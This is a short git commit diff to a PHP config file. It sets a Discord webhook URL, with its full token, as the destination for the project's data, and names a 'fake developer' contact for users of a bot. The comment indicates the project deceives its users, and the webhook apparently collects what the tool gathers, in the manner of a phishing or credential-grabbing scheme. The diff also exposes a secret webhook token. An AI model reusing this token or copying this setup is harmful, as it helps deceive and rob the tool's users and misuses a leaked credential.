7d75f4095a8ad837be09690990bc04a113992b94
brettduh <78511872+brettduh@users.noreply.github.com>
2021-02-04 19:58:21 +0800

    Update config.php

--- config.php
+++ config.php
@@ -1,6 +1,6 @@
 <?php
     // webhook link
-    $webhook = "webhook";
+    $webhook = "https://discord.com/api/webhooks/806415798930636800/HhfI04uc9eieFUg2XRy7H7QHd2saPs0YTdqanPbRK_tHPVlxq5fWShLrjJ69MZLtmJp7";
     // fake developer for the bot the users may contact
     $discord_contact = "5Haze#0001";
     
